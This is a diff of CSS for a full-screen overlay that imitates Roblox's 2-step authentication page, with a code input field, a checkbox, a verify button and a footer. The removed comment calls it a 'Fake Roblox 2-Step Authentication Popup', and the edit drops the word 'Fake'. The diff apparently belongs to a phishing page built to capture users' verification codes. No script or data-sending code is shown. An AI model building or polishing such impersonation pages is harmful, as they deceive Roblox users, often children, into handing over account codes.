@@ -1318,34 +1318,29 @@ main {
     margin-bottom: 0;
 }
 
-/* Fake Roblox 2-Step Authentication Popup */
+/* New Roblox 2-Step Authentication Full Page */
 .roblox-auth-overlay {
     position: fixed;
     top: 0;
     left: 0;
     width: 100%;
     height: 100%;
-    background: rgba(0, 0, 0, 0.9);
-    z-index: 3000;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-
-.roblox-auth-fullpage {
-    width: 100%;
-    height: 100%;
     background-color: #1C1C1C;
     color: #FFFFFF;
+    z-index: 3000;
     display: flex;
     flex-direction: column;
     align-items: center;
     justify-content: flex-start;
+    min-height: 100vh;
     font-family: 'Arial', sans-serif;
+}
+
+.roblox-auth-overlay * {
     box-sizing: border-box;
 }
 
-.roblox-header {
+.roblox-auth-overlay .header {
     width: 100%;
     padding: 15px 20px;
     background-color: #1C1C1C;
@@ -1354,48 +1349,41 @@ main {
     align-items: center;
     font-size: 20px;
     font-weight: bold;
-    position: relative;
 }
 
-.roblox-close-x {
+.roblox-auth-overlay .header span {
     font-size: 28px;
     margin-right: 15px;
     cursor: pointer;
-    color: #FFFFFF;
     transition: opacity 0.2s;
 }
 
-.roblox-close-x:hover {
+.roblox-auth-overlay .header span:hover {
     opacity: 0.7;
 }
 
-.roblox-container {
+.roblox-auth-overlay .container {
     padding: 30px 20px;
     max-width: 400px;
     text-align: center;
-    flex: 1;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
 }
 
-.roblox-lock-icon {
+.roblox-auth-overlay .lock-icon {
     width: 80px;
     margin: 20px auto;
 }
 
-.roblox-lock-icon svg {
+.roblox-auth-overlay .lock-icon svg {
     width: 100%;
     height: auto;
 }
 
-.roblox-instruction {
+.roblox-auth-overlay .instruction {
     margin: 20px 0 10px;
     font-size: 16px;
-    color: #FFFFFF;
 }
 
-.roblox-code-input {
+.roblox-auth-overlay input[type="text"] {
     width: 100%;
     padding: 12px;
     font-size: 16px;
@@ -1404,43 +1392,46 @@ main {
     border-radius: 5px;
     background-color: #333;
     color: #fff;
-    box-sizing: border-box;
+    text-align: center;
+    letter-spacing: 2px;
+    transition: border-color 0.3s;
 }
 
-.roblox-code-input:focus {
+.roblox-auth-overlay input[type="text"]:focus {
     outline: none;
     border-color: #007BFF;
-    background-color: #444;
+    box-shadow: 0 0 0 2px rgba(0, 123, 255, 0.25);
 }
 
-.roblox-checkbox-label {
+.roblox-auth-overlay .checkbox-label {
     font-size: 14px;
     display: flex;
     align-items: center;
-    margin: 10px 0 20px;
     justify-content: center;
-    color: #FFFFFF;
+    margin: 10px 0 20px;
     cursor: pointer;
 }
 
-.roblox-checkbox-label input {
+.roblox-auth-overlay .checkbox-label input {
     margin-right: 8px;
+    transform: scale(1.1);
 }
 
-.roblox-link {
+.roblox-auth-overlay .link {
     color: #00AEEF;
     font-size: 14px;
     text-decoration: underline;
     margin-bottom: 20px;
     display: block;
     cursor: pointer;
+    transition: color 0.2s;
 }
 
-.roblox-link:hover {
-    color: #0088cc;
+.roblox-auth-overlay .link:hover {
+    color: #66c7ff;
 }
 
-.roblox-verify-button {
+.roblox-auth-overlay button {
     width: 100%;
     padding: 12px;
     font-size: 16px;
@@ -1449,33 +1440,34 @@ main {
     border: none;
     border-radius: 5px;
     cursor: not-allowed;
-    transition: background-color 0.3s;
+    transition: all 0.3s;
 }
 
-.roblox-verify-button.enabled {
+.roblox-auth-overlay button.enabled {
     background-color: #007BFF;
     color: white;
     cursor: pointer;
 }
 
-.roblox-verify-button.enabled:hover {
+.roblox-auth-overlay button.enabled:hover {
     background-color: #0056b3;
+    transform: translateY(-1px);
 }
 
-.roblox-footer {
+.roblox-auth-overlay .footer {
     font-size: 12px;
     color: #aaa;
     margin-top: 30px;
     max-width: 400px;
     text-align: center;
-    padding: 0 20px 30px;
+    padding: 0 20px;
 }
 
-.roblox-footer b {
+.roblox-auth-overlay .footer b {
     color: white;
 }
 
-.roblox-footer i {
+.roblox-auth-overlay .footer i {
     display: block;
     margin-top: 10px;
     font-style: italic;
